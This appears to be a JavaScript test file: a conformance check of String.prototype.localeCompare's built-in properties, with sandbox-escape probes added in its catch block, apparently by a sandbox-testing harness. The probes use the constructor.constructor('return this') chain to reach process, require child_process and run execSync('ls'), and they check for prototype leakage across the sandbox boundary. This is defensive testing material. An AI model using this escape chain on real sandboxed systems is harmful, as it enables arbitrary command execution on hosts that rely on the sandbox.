try {
    assert.sameValue(Object.prototype.toString.call(String.prototype.localeCompare), '[object Function]', 'The [[Class]] internal property of a built-in function must be ' + '"Function".');
    assert(Object.isExtensible(String.prototype.localeCompare), 'Built-in objects must be extensible.');
    assert.sameValue(Object.getPrototypeOf(String.prototype.localeCompare), Function.prototype);
    assert.sameValue(String.prototype.localeCompare.hasOwnProperty('prototype'), false, 'Built-in functions that aren\'t constructors must not have a prototype property.');
    assert.sameValue(isConstructor(String.prototype.localeCompare), false, 'Built-in functions don\'t implement [[Construct]] unless explicitly specified.');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}